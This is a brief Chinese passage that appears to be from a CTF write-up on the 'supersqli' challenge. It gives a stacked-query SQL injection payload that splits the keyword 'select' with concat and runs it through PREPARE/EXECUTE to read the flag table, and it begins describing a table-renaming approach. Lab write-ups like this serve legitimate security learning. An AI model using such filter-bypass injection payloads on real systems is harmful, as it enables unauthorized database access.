思路 1

这里丢几个思路，

最先看到的：

‘;use supersqli ; set @sql=concat(‘s’,’elect `flag` from `1919810931114514`‘);PREPARE stmt1 FROM @sql;EXECUTE stmt1;–

思路2

然后第二个思路是从一开始分享的那个链接里看到的：

  1. 通过将 1919810931114514（flag表） 表名修改为 words(默认的查询表)
